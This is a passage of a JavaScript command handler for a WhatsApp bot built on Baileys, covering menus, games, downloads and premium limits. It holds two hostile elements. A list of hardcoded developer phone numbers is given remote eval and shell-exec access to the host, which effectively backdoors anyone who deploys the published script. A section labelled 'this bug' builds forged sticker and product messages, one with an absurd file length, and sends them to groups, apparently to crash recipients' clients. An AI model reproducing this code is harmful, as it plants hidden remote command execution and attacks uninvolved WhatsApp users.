// akumah masih pemula
// ajarin dong puh
// sepuhhhh
/*
• Team Tabrak Lurus
• WhyDepin-Darwin-KiiCode
*/
require("../config");
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
const baileys = require("@whiskeysockets/baileys");
const fs = require("fs");
const chalk = require("chalk");
const axios = require("axios");
const path = require("path");
const yts = require("yt-search");
const bochil = require("@bochilteam/scraper");
const { exec } = require("child_process");
const util = require("util");
const ms = require("parse-ms");
const { rimraf } = require("rimraf");
const ffmpeg = require("fluent-ffmpeg");
const Jimp = require("jimp");

//Libary
const {
  isLimit,
  limitAdd,
  getLimit,
  giveLimit,
  addBalance,
  kurangBalance,
  getBalance,
  isGame,
  gameAdd,
  givegame,
  cekGLimit,
} = require("../lib/limit");
const { getBuffer, getRandom } = require("../lib/myfunc");
const _prem = require("../lib/premium");
const func = require("../lib/function.js");

const { fetchJson } = require("../lib/fetcher.js");
const { uploadImages } = require("../lib/uploadimage.js");
const { webp2mp4File } = require("../lib/convert");
const { pinterest } = require("../lib/pinterest");
const { isTicTacToe, getPosTic } = require("../lib/tictactoe");
const {
  addPlayGame,
  getJawabanGame,
  isPlayGame,
  cekWaktuGame,
  getGamePosi,
} = require("../lib/game");
const tictac = require("../lib/tictac");
// Exif
const Exif = require("../lib/exif");
const exif = new Exif();

//database
let _cmd = JSON.parse(fs.readFileSync("./database/command.json"));
let _cmdUser = JSON.parse(fs.readFileSync("./database/commandUser.json"));
let pendaftar = JSON.parse(fs.readFileSync("./database/user.json"));
let premium = JSON.parse(fs.readFileSync("./database/premium.json"));
let balance = JSON.parse(fs.readFileSync("./database/balance.json"));
let limit = JSON.parse(fs.readFileSync("./database/limit.json"));
let glimit = JSON.parse(fs.readFileSync("./database/glimit.json"));

// Hit
global.hit = {};
// DB Game
let tictactoe = [];
let tebakgambar = [];
let akinator = {};

//short
const evalOwn = [
  `6283896302781`,
  "628871746203",
  "6281384447735",
  "62831311533003",
];
const evalOwns = [
  `6283896302781@s.whatsapp.net`,
  `62831311533003@s.whatsapp.net`,
  "628871746203@s.whatsapp.net",
  "6281384447735@s.whatsapp.net",
]; //akes eval
var icon = fs.readFileSync("./src/dep.jpg");

module.exports = async (tabrak, m, store) => {
  try {
    if (!m) return;
    if (m.isBaileys) return;

    const content = JSON.stringify(m.message);
    const from = m.key.remoteJid;
    const chats =
      m.type === "conversation" && m.message.conversation
        ? m.message.conversation
        : m.type == "imageMessage" && m.message.imageMessage.caption
        ? m.message.imageMessage.caption
        : m.type == "documentMessage" && m.message.documentMessage.caption
        ? m.message.documentMessage.caption
        : m.type == "videoMessage" && m.message.videoMessage.caption
        ? m.message.videoMessage.caption
        : m.type == "extendedTextMessage" && m.message.extendedTextMessage.text
        ? m.message.extendedTextMessage.text
        : m.type == "buttonsResponseMessage" &&
          m.message.buttonsResponseMessage.selectedButtonId
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.type == "templateButtonReplyMessage" &&
          m.message.templateButtonReplyMessage.selectedId
        ? m.message.templateButtonReplyMessage.selectedId
        : "";
    if (tabrak.multi) {
      var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats)
        ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)
        : "#";
    } else {
      if (tabrak.nopref) {
        prefix = "";
      } else {
        prefix = tabrak.prefa;
      }
    }
    const args = chats.split(" ");
    const command = chats.toLowerCase().split(" ")[0] || "";
    const isCmd = command.startsWith(prefix);
    const q = chats.slice(command.length + 1, chats.length);
    const botNumber = tabrak.user.id.split(":")[0] + "@s.whatsapp.net";
    const isGroup = m.key.remoteJid.endsWith("@g.us");
    const sender = isGroup
      ? m.key.participant
        ? m.key.participant
        : m.participant
      : m.key.remoteJid;
    const isOwner =
      global.owner == sender
        ? true
        : [`${global.owner}@s.whatsapp.net`].includes(sender)
        ? true
        : false;
    const isClone =
      botNumber.split("@")[0] == sender
        ? true
        : [botNumber].includes(sender)
        ? true
        : false;
    const isEval =
      evalOwn == sender ? true : evalOwns.includes(sender) ? true : false;
    const isUser = pendaftar.includes(sender);
    const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium);

    //Function Line!!!
    async function akiStart() {
      var data = await fetchJson(
        `https://api.lolhuman.xyz/api/akinator/start?apikey=${lolkey}`
      );
      return data;
    }

    async function akiAnswer(
      server,
      frontaddr,
      session,
      signature,
      step,
      answer
    ) {
      var data = await fetchJson(
        `https://api.lolhuman.xyz/api/akinator/answer?apikey=${lolkey}&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&step=${step}&answer=${answer}`
      );
      return data;
    }

    async function akiBack(
      server,
      frontaddr,
      session,
      signature,
      step,
      answer
    ) {
      var data = await fetchJson(
        `https://api.lolhuman.xyz/api/akinator/back?apikey=${lolkey}&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&step=${step}&answer=${answer}`
      );
      return data;
    }

    async function addCountCmdUser(nama, sender, u) {
      var posi = null;
      var pos = null;
      Object.keys(u).forEach((i) => {
        if (u[i].jid === sender) {
          posi = i;
        }
      });
      if (posi === null) {
        u.push({ jid: sender, db: [{ nama: nama, count: 0 }] });
        fs.writeFileSync(
          "./database/commandUser.json",
          JSON.stringify(u, null, 2)
        );
        Object.keys(u).forEach((i) => {
          if (u[i].jid === sender) {
            posi = i;
          }
        });
      }
      if (posi !== null) {
        Object.keys(u[posi].db).forEach((i) => {
          if (u[posi].db[i].nama === nama) {
            pos = i;
          }
        });
        if (pos === null) {
          u[posi].db.push({ nama: nama, count: 1 });
          fs.writeFileSync(
            "./database/commandUser.json",
            JSON.stringify(u, null, 2)
          );
        } else {
          u[posi].db[pos].count += 1;
          fs.writeFileSync(
            "./database/commandUser.json",
            JSON.stringify(u, null, 2)
          );
        }
      }
    }

    async function getPosiCmdUser(sender, _db) {
      var posi = null;
      Object.keys(_db).forEach((i) => {
        if (_db[i].jid === sender) {
          posi = i;
        }
      });
      return posi;
    }

    async function addCountCmd(nama, sender, _db) {
      addCountCmdUser(nama, sender, _cmdUser);
      var posi = null;
      Object.keys(_db).forEach((i) => {
        if (_db[i].nama === nama) {
          posi = i;
        }
      });
      if (posi === null) {
        _db.push({ nama: nama, count: 1 });
        fs.writeFileSync(
          "./database/command.json",
          JSON.stringify(_db, null, 2)
        );
      } else {
        _db[posi].count += 1;
        fs.writeFileSync(
          "./database/command.json",
          JSON.stringify(_db, null, 2)
        );
      }
    }

    const mentionByTag =
      m.type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.mentionedJid
        : [];
    const mentionByReply =
      m.type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.participant || ""
        : "";
    const mention =
      typeof mentionByTag == "string" ? [mentionByTag] : mentionByTag;
    mention != undefined ? mention.push(mentionByReply) : [];
    const mentionUser = mention != undefined ? mention.filter((n) => n) : [];

    const generatePp = async (buffer) => {
      const jimp_1 = await Jimp.read(buffer);
      const resz =
        jimp_1.getWidth() > jimp_1.getHeight()
          ? jimp_1.resize(550, Jimp.AUTO)
          : jimp_1.resize(Jimp.AUTO, 650);
      const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
      return {
        img: await resz.getBufferAsync(Jimp.MIME_JPEG),
      };
    };

    const sendFileFromUrl = async function (from, url, caption, m, men) {
      let mime = "";
      let res = await axios.head(url);
      mime = res.headers["content-type"];
      if (mime.split("/")[1] === "gif") {
        return tabrak.sendMessage(
          from,
          {
            video: await getBuffer(url),
            caption: caption,
            gifPlayback: true,
            mentions: men ? men : [],
            mimetype: "video/mp4",
          },
          { quoted: m }
        );
      }
      let type = mime.split("/")[0] + "Message";
      if (mime === "application/pdf") {
        return tabrak.sendMessage(
          m.chat,
          {
            document: await getBuffer(url),
            mimetype: "application/pdf",
            caption: caption,
            mentions: men ? men : [],
          },
          { quoted: m }
        );
      }
      if (mime.split("/")[0] === "image") {
        return tabrak.sendMessage(
          m.chat,
          {
            image: await getBuffer(url),
            caption: caption,
            mentions: men ? men : [],
          },
          { quoted: m }
        );
      }
      if (mime.split("/")[0] === "video") {
        return tabrak.sendMessage(
          m.chat,
          {
            video: await getBuffer(url),
            caption: caption,
            mentions: men ? men : [],
            mimetype: "video/mp4",
          },
          { quoted: m }
        );
      }
      if (mime.split("/")[0] === "audio") {
        return tabrak.sendMessage(
          m.chat,
          {
            audio: await getBuffer(url),
            caption: caption,
            mentions: men ? men : [],
            mimetype: "audio/mpeg",
          },
          { quoted: m }
        );
      }
    };

    async function downloadAndSaveMediaMessage(type_file, path_file) {
      if (type_file === "image") {
        var stream = await downloadContentFromMessage(
          m.message.imageMessage ||
            m.message.extendedTextMessage?.contextInfo.quotedMessage
              .imageMessage,
          "image"
        );
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        fs.writeFileSync(path_file, buffer);
        return path_file;
      } else if (type_file === "video") {
        var stream = await downloadContentFromMessage(
          m.message.videoMessage ||
            m.message.extendedTextMessage?.contextInfo.quotedMessage
              .videoMessage,
          "video"
        );
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        fs.writeFileSync(path_file, buffer);
        return path_file;
      } else if (type_file === "sticker") {
        var stream = await downloadContentFromMessage(
          m.message.stickerMessage ||
            m.message.extendedTextMessage?.contextInfo.quotedMessage
              .stickerMessage,
          "sticker"
        );
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        fs.writeFileSync(path_file, buffer);
        return path_file;
      } else if (type_file === "audio") {
        var stream = await downloadContentFromMessage(
          m.message.audioMessage ||
            m.message.extendedTextMessage?.contextInfo.quotedMessage
              .audioMessage,
          "audio"
        );
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        fs.writeFileSync(path_file, buffer);
        return path_file;
      }
    }

    //baris function 2
    greply = (from, content, m) =>
      tabrak.sendMessage(from, { text: content }, { quoted: m });
    const reply = (teks) => {
      tabrak.sendMessage(from, { text: teks }, { quoted: m });
    };
    decodeJid = (jid) => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = baileys.jidDecode(jid) || {};
        return (
          (decode.user && decode.server && decode.user + "@" + decode.server) ||
          jid
        );
      } else return jid;
    };
    const sendAnon = (huhu, teks) => {
      tabrak.sendMessage(
        huhu,
        {
          text: teks,
          contextInfo: {
            externalAdReply: {
              title: "Anonymous Chat",
              body: "© Team Tabrak Lurus",
              thumbnailUrl: "https://telegra.ph/file/a98be7c29caae2e13dbc9.jpg",
              sourceUrl: "https://chat.whatsapp.com/Bs2eptyeXtd9icSiYSYbO0",
              mediaType: 1,
              showAdAttribution: true,
              renderLargerThumbnail: true,
            },
          },
        },
        { quoted: m }
      );
    };
    const sendContact = (jid, numbers, name, quoted, mn) => {
      let number = numbers.replace(/[^0-9]/g, "");
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        name +
        "\n" +
        "ORG:;\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        number +
        ":+" +
        number +
        "\n" +
        "END:VCARD";

      return tabrak.sendMessage(
        from,
        {
          contacts: { displayName: name, contacts: [{ vcard }] },
          mentions: mn ? mn : [],
        },
        { quoted: m }
      );
    };
    const sendMess = (hehe, teks) => {
      tabrak.sendMessage(hehe, { text: teks });
    };

    const sendText = (from, teks) => {
      tabrak.sendMessage(from, { text: teks }, { quoted: m });
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
          "gi"
        )
      );
    };
    function jsonformat(string) {
      return JSON.stringify(string, null, 2);
    }
    function monospace(string) {
      return "```" + string + "```";
    }
    function randomNomor(min, max = null) {
      if (max !== null) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
      } else {
        return Math.floor(Math.random() * min) + 1;
      }
    }
    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };
    function mentions(teks, mems = [], id) {
      if (id == null || id == undefined || id == false) {
        let res = tabrak.sendMessage(from, { text: teks, mentions: mems });
        return res;
      } else {
        let res = tabrak.sendMessage(
          from,
          { text: teks, mentions: mems },
          { quoted: m }
        );
        return res;
      }
    }

    function runtime(seconds) {
      seconds = Number(seconds);
      var d = Math.floor(seconds / (3600 * 24));
      var h = Math.floor((seconds % (3600 * 24)) / 3600);
      var m = Math.floor((seconds % 3600) / 60);
      var s = Math.floor(seconds % 60);
      var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
      var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
      var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
      var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
      return dDisplay + hDisplay + mDisplay + sDisplay;
    }

    //fake line
    let fimage = {
      key: {
        fromMe: false,
        participant: from,
        remoteJid: "status@broadcast",
        status: 2,
      },
      message: {
        imageMessage: {
          mimetype: "image/jpeg",
          caption: "Bens - MD",
          jpegThumbnail: fs.readFileSync("./src/dep.jpg"),
          forwardingScore: 9292,
          isForwarded: true,
        },
      },
    };

    const bugstic = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        remoteJid: "",
      },
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/d/f/AnffZCEiLJkOPQl73bGK5zD5-slVVHkFgmlLdBHEZf6P.enc",
          mimetype: "image/webp",
          height: 64,
          width: 64,
          directPath:
            "/v/t62.7118-24/30987623_320394093578641_3348511406084858913_n.enc?ccb=11-4&oh=01_AVwRvNEF0na_IL-_iakYz-qMrR9dt1Be_pC3WcYMnKT3UQ&oe=62B1A809",
          fileLength: 99999999999999,
          mediaKeyTimestamp: 166666,
          isAnimated: false,
        },
      },
    };

    let bugfc = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...{ remoteJid: "" },
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync("./src/dep.jpg"),
            },
            title: `© Tabrak Lurus`,
            description: m.pushName,
            currencyCode: "USD",
            priceAmount1000: "0",
            retailerId: "Bug Dep",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };

    //this bug
    const katalog = (grup, teks) => {
      tabrak.sendMessage(grup, { text: teks }, { quoted: bugfc });
    };
    const sticker = (grup, teks) => {
      tabrak.sendMessage(grup, { text: teks }, { quoted: bugstic });
    };
    //end

    // Auto Reg
    if (isCmd && !isUser) {
      pendaftar.push(sender);
      fs.writeFileSync(
        "./database/user.json",
        JSON.stringify(pendaftar, null, 2)
      );
    }

    // Premium
    _prem.expiredCheck(tabrak, premium);

    /*push command
		hitCmd.push(command)
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
		*/

    setInterval(() => {
      fs.writeFileSync(
        "./database/akinator.json",
        JSON.stringify(akinator, null, 2)
      );
    }, 30 * 1000);

    // Akinator
    if (
      !isGroup &&
      akinator.hasOwnProperty(sender.split("@")[0]) &&
      !isCmd &&
      ["0", "1", "2", "3", "4"].includes(chats)
    ) {
      var { server, frontaddr, session, signature, question, step } =
        akinator[sender.split("@")[0]];
      var jwb = (
        await akiAnswer(server, frontaddr, session, signature, step, chats)
      ).result;
      if (jwb.hasOwnProperty("name")) {
        var img = await getBuffer(jwb.image);
        var cpt = `*HASIL DITEMUKAN*\n\nNama : ${jwb.name}\nDeskripsi : ${jwb.description}`;
        tabrak
          .sendMessage(from, { image: img, caption: cpt }, { quoted: m })
          .then((res) => {
            delete akinator[sender.split("@")[0]];
          });
        return;
      }
      var jques = jwb.question;
      var jstep = jwb.step;
      var jteks = `${jques}\n\n`;
      jteks += `0 - Ya\n`;
      jteks += `1 - Tidak\n`;
      jteks += `2 - Tidak Tahu\n`;
      jteks += `3 - Mungkin\n`;
      jteks += `4 - Mungkin Tidak`;
      tabrak.sendMessage(from, { text: jteks }, { quoted: m }).then((res) => {
        var jaki = akinator[sender.split("@")[0]];
        jaki.question = jques;
        jaki.step = jstep;
        akinator[sender.split("@")[0]] = jaki;
      });
    }

    // Tictactoe
    if (isTicTacToe(from, tictactoe))
      tictac(
        chats,
        prefix,
        tictactoe,
        from,
        sender,
        reply,
        mentions,
        addBalance,
        balance
      );

    // Game
    cekWaktuGame(tabrak, tebakgambar);
    if (isPlayGame(from, tebakgambar) && isUser) {
      if (chats.toLowerCase() == getJawabanGame(from, tebakgambar)) {
        var htgm = randomNomor(100, 150);
        addBalance(sender, htgm, balance);
        reply(
          `*Jawaban ${m.pushName} Benar*\n\nJawaban : ${getJawabanGame(
            from,
            tebakgambar
          )}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakgambar*`
        );
        tebakgambar.splice(getGamePosi(from, tebakgambar), 1);
      }
    }

    // Presence Online
    tabrak.sendPresenceUpdate("available", from);
    tabrak.sendReceipt(from, sender, [m.key.id], "read");

    if (chats.startsWith("=> ") && isOwner && isEval) {
      console.log(chalk.green("[EVAL]"), chalk.white(`Dari Owner aowkoakwoak`));
      const ev = (sul) => {
        var sat = JSON.stringify(sul, null, 2);
        var bang = util.format(sat);
        if (sat == undefined) {
          bang = util.format(sul);
        }
        return reply(bang);
      };
      try {
        reply(util.format(eval(`;(async () => { ${chats.slice(2)} })()`)));
      } catch (e) {
        reply(util.format(e));
      }
    } else if (chats.startsWith("$ ") && isEval) {
      console.log(chalk.green("[EXEC]"), chalk.white(`Dari Owner aowkoakwoak`));
      exec(chats.slice(2), (err, stdout) => {
        if (err) return reply(`${err}`);
        if (stdout) reply(`${stdout}`);
      });
    } else if (chats.startsWith("> ") && isEval) {
      console.log(chalk.green("[EVAL]"), chalk.white(`Dari Owner aowkaokwoak`));
      try {
        let evaled = await eval(chats.slice(2));
        if (typeof evaled !== "string")
          evaled = require("util").inspect(evaled);
        reply(`${evaled}`);
      } catch (err) {
        reply(`${err}`);
      }
    }
    //Function Anonymous Nuru
    const str2Regex = (str) => str.replace(/[|\\{}()[\]^$+*?.]/g, "\\$&");
    const match = (
      prefix instanceof RegExp // RegExp Mode?
        ? [[prefix.exec(m.text), prefix]]
        : Array.isArray(prefix) // Array?
        ? prefix.map((p) => {
            let re =
              p instanceof RegExp // RegExp in Array?
                ? p
                : new RegExp(str2Regex(p));
            return [re.exec(m.text), re];
          })
        : typeof prefix === "string" // String?
        ? [
            [
              new RegExp(str2Regex(prefix)).exec(m.text),
              new RegExp(str2Regex(prefix)),
            ],
          ]
        : [[[], new RegExp()]]
    ).find((p) => p[1]);
    if (match && m.chat.endsWith("@s.whatsapp.net") && !isCmd) {
      this.anonymous = this.anonymous ? this.anonymous : {};
      let room = Object.values(this.anonymous).find(
        (room) =>
          [room.a, room.b].includes(m.sender) && room.state === "CHATTING"
      );
      if (room) {
        if (/^.*(next|leave|start)/.test(m.text)) return;
        if (
          [
            ".next",
            ".leave",
            ".stop",
            ".start",
            "Cari Partner",
            "Keluar",
            "Lanjut",
            "Stop",
          ].includes(m.text)
        )
          return;
        let other = [room.a, room.b].find((user) => user !== m.sender);
        m.copyNForward(
          other,
          true,
          m.quoted && m.quoted.fromMe
            ? {
                contextInfo: {
                  ...m.msg.contextInfo,
                  forwardingScore: 1,
                  isForwarded: true,
                  participant: other,
                },
              }
            : {}
        );
      }
      return !0;
    }

    const isImage = m.type == "imageMessage";
    const isVideo = m.type == "videoMessage";
    const isSticker = m.type == "stickerMessage";
    const isQuotedMsg = m.type == "extendedTextMessage";
    const isQuotedImage = isQuotedMsg
      ? content.includes("imageMessage")
        ? true
        : false
      : false;
    const isQuotedAudio = isQuotedMsg
      ? content.includes("audioMessage")
        ? true
        : false
      : false;
    const isQuotedDocument = isQuotedMsg
      ? content.includes("documentMessage")
        ? true
        : false
      : false;
    const isQuotedVideo = isQuotedMsg
      ? content.includes("videoMessage")
        ? true
        : false
      : false;
    const isQuotedSticker = isQuotedMsg
      ? content.includes("stickerMessage")
        ? true
        : false
      : false;

    // log chat masuk
    if (m.message && !m.isBaileys) {
      console.log(
        chalk.white(chalk.bgBlue("PESAN CLONE :")),
        chalk.black(chalk.bgWhite(m.body || m.type))
      );
    }

    switch (command) {
      case prefix + "dashboard":
      case prefix + "dash":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        var posi = await getPosiCmdUser(sender, _cmdUser);
        _cmdUser[posi].db.sort((a, b) => (a.count < b.count ? 1 : -1));
        _cmd.sort((a, b) => (a.count < b.count ? 1 : -1));
        var posi = await getPosiCmdUser(sender, _cmdUser);
        var jumlahCmd = _cmd.length;
        if (jumlahCmd > 10) jumlahCmd = 10;
        var jumlah = _cmdUser[posi].db.length;
        if (jumlah > 5) jumlah = 5;
        var totalUser = 0;
        for (let x of _cmdUser[posi].db) {
          totalUser = totalUser + x.count;
        }
        var total = 0;
        for (let o of _cmd) {
          total = total + o.count;
        }
        var teks = `*BENS-MD DASHBOARD*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`;
        teks += `*Most Command Global*\n`;
        for (let u = 0; u < jumlahCmd; u++) {
          teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`;
        }
        reply(teks);
        break;

      case prefix + "menu":
      case prefix + "allmenu":
      case prefix + "help":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          let text = `
_*👋Hello ${m.pushName}, dibawah ini adalah menu dari Bens - MD*_
                
╭────✎「 _*USER INFO*_ 」
│ _*Name:*_ _${m.pushName}_
│ _*Number:*_ _${sender.split("@")[0]}_
├────✎「 _*BOT INFO*_ 」
│ _*Bot Name:*_ _${tabrak.user.name}_
│ _*Registration:*_ _${pendaftar.length}_
│ _*Runtime:*_ _${runtime(process.uptime())}_
│ _*Created By:*_ _Team Tabrak Lurus_
└───────────❍

╭─✎「 _*-MAIN MENU-*_ 」
│• ${prefix}owner
│• ${prefix}sc
│• ${prefix}dashboard
╰───────────❍

╭─✎「 _*-JADIBOT NEW-*_ 」
│• ${prefix}jadibot
│• ${prefix}stopjadibot
│• ${prefix}listjadibot
╰───────────❍

╭─✎「 _*-GAME MENU-*_ 」
│• ${prefix}tictactoe
│• ${prefix}delttc
│• ${prefix}tebakgambar
│• ${prefix}akinator
│• ${prefix}delakinator
╰───────────❍

╭─✎「 _*-EDUCATION MENU-*_ 」
│• ${prefix}roboguru
│• ${prefix}brainly
│• ${prefix}wikipedia
╰───────────❍

╭─✎「 _*-OWNER MENU-*_ 」
│• ${prefix}broadcast
│• ${prefix}addprem
│• ${prefix}delprem
│• ${prefix}addakses
│• ${prefix}exif
│• ${prefix}setpp
│• > (Eval)
│• $ (Exec)
╰───────────❍

╭─✎「 _*-USER MENU-*_ 」
│• ${prefix}ceklimit
│• ${prefix}cekprem
│• ${prefix}transfer
│• ${prefix}buylimit
│• ${prefix}buyglimit
│• ${prefix}topbalance
╰────────────❍

╭─✎「 _*-ANONYMOUS CHAT-*_ 」
│• ${prefix}anonymous
│• ${prefix}start
│• ${prefix}next
│• ${prefix}leave
╰────────────❍

╭─✎「 *_-TOOLS MENU-_* 」
│• ${prefix}tourl
│• ${prefix}sticker
│• ${prefix}ocr
╰────────────❍

╭─✎「 *_-DOWNLOAD/SEARCH MENU-_* 」
│• ${prefix}ytsearch
│• ${prefix}getvideo
│• ${prefix}getmusic
│• ${prefix}ytdl
│• ${prefix}pinterest
│• ${prefix}instagram
│• ${prefix}facebook
│• ${prefix}tiktok
│• ${prefix}tiktokaudio
│• ${prefix}mediafire
│• ${prefix}whatanime
│• ${prefix}whatmanga
│• ${prefix}animesearch
╰────────────❍

╭─✎「 *_-OPENAI MENU-_* 」
│• ${prefix}ai
│• ${prefix}text2image 
╰────────────❍

╭─✎「 *_-RANDOM MENU-_* 」
│• ${prefix}art
│• ${prefix}awoo
│• ${prefix}bts
│• ${prefix}cogan
│• ${prefix}elaina
│• ${prefix}exo
│• ${prefix}elf
│• ${prefix}estetic
│• ${prefix}kanna
│• ${prefix}loli
│• ${prefix}neko2
│• ${prefix}waifu
│• ${prefix}shota
│• ${prefix}husbu
│• ${prefix}sagiri
│• ${prefix}shinobu
│• ${prefix}megumin
│• ${prefix}wallnime
│• ${prefix}quotesimage
╰────────────❍

╭─✎「 *_-TEXT PRO ME-_* 」
│• ${prefix}blackpink
│• ${prefix}neon
│• ${prefix}greenneon
│• ${prefix}advanceglow
│• ${prefix}futureneon
│• ${prefix}sandwriting
│• ${prefix}sandsummer
│• ${prefix}sandengraved
│• ${prefix}metaldark
│• ${prefix}neonlight
│• ${prefix}holographic
│• ${prefix}text1917
│• ${prefix}minion
│• ${prefix}deluxesilver
│• ${prefix}newyearcard
│• ${prefix}bloodfrosted
│• ${prefix}halloween
│• ${prefix}jokerlogo
│• ${prefix}fireworksparkle
│• ${prefix}natureleaves
│• ${prefix}bokeh
│• ${prefix}toxic
│• ${prefix}strawberry
│• ${prefix}box3d
│• ${prefix}roadwarning
│• ${prefix}breakwall
│• ${prefix}icecold
│• ${prefix}luxury
│• ${prefix}cloud
│• ${prefix}summersand
│• ${prefix}horrorblood
│• ${prefix}thunder
╰────────────❍
*V.1.1 BETA || © BENS CLONE*`;

          reply(text);
          /*
let wiwin = await getBuffer("https://telegra.ph/file/91319fd55958d7f884d26.jpg")
var troll = await baileys.generateWAMessageFromContent(from, baileys.proto.Message.fromObject({
"orderMessage": {
    "orderId": '283883221302853',
    "thumbnail": fs.readFileSync("./src/dep.jpg"),
    "itemCount": 1000,
    "message": text,
    "orderTitle": 'Bens - MD',
    "sellerJid": '62858005029610@s.whatsapp.net',
    "token": 'AR4r3fC1ks2z5CV1XrXLWdfnJrjKeIp/poAUiEZxS6/1KQ==',
    "totalAmount1000": 100000,
    "totalCurrencyCode": 'USD'
  }
    }), {
	contextInfo: {
		...m.msg.contextInfo,
        title: `Team Tabrak Lurus`
	}
})
return tabrak.relayMessage(from, troll.message, {messageId:troll.key.id})
*/
        }
        break;
      case prefix + "sc": {
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        reply("_*Script: https://github.com/WhyDepin/baileys-bot-whatsapp*_");
        break;
      }
      case prefix + "owner":
        {
          addCountCmd(command, sender, _cmd);
          sendContact(from, botNumber, "Bens clone!!", m);
        }
        break;
      // Textprome //
      case prefix + "blackpink":
      case prefix + "neon":
      case prefix + "greenneon":
      case prefix + "advanceglow":
      case prefix + "futureneon":
      case prefix + "sandwriting":
      case prefix + "sandsummer":
      case prefix + "sandengraved":
      case prefix + "metaldark":
      case prefix + "neonlight":
      case prefix + "holographic":
      case prefix + "text1917":
      case prefix + "minion":
      case prefix + "deluxesilver":
      case prefix + "newyearcard":
      case prefix + "bloodfrosted":
      case prefix + "halloween":
      case prefix + "jokerlogo":
      case prefix + "fireworksparkle":
      case prefix + "natureleaves":
      case prefix + "bokeh":
      case prefix + "toxic":
      case prefix + "strawberry":
      case prefix + "box3d":
      case prefix + "roadwarning":
      case prefix + "breakwall":
      case prefix + "icecold":
      case prefix + "luxury":
      case prefix + "cloud":
      case prefix + "summersand":
      case prefix + "horrorblood":
      case prefix + "thunder":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (!q) return reply(`Gunakan dengan cara ${prefix + command} *text*`);
        if (args.length == 0) return reply(`Example: ${command} BENS AYE`);
        tabrak.sendMessage(from, {
          image: {
            url: `https://api.lolhuman.xyz/api/textprome/${
              command.split(prefix)[1]
            }?text=${q}&apikey=${global.lolkey}`,
          },
        });
        limitAdd(sender, limit);
        break;
      //owner
      case prefix + "setpp":
        {
          addCountCmd(command.split(prefix)[1], sender, _cmd);
          if (!isClone) return reply("owner");
          if (isImage || isQuotedImage) {
            var media = await downloadAndSaveMediaMessage(
              "image",
              "ppbot.jpeg"
            );
            const { img } = await generatePp(media);
            await tabrak.query({
              tag: "iq",
              attrs: {
                to: botNumber,
                type: "set",
                xmlns: "w:profile:picture",
              },
              content: [
                {
                  tag: "picture",
                  attrs: { type: "image" },
                  content: img,
                },
              ],
            });
            fs.unlinkSync(media);
            reply(`Sukses`);
          } else {
            reply(
              `Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`
            );
          }
        }
        break;
      case prefix + "addakses":
        if (!q) return reply("Contoh: .addakses 62xxxx");
        if (!isOwner) return reply("Only Owner");
        evalOwn.push(q);
        evalOwns.push(q + "@s.whatsapp.net");
        reply("done mint");
        break;
      case prefix + "addprem":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!isOwner) return reply("Only Owner");
        if (args.length < 2)
          return reply(
            `Penggunaan :\n*${prefix}addprem* @tag waktu\n*${prefix}addprem* nomor waktu\n\nContoh : ${command} @tag 30d`
          );
        if (!args[2]) return reply(`Mau yang berapa hari?`);
        if (m.mentioned.length !== 0) {
          _prem.addPremiumUser(m.mentioned[0], args[2], premium);
          reply("Sukses");
        } else {
          var cekap = await tabrak.onWhatsApp(args[1] + "@s.whatsapp.net");
          if (cekap.length == 0)
            return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`);
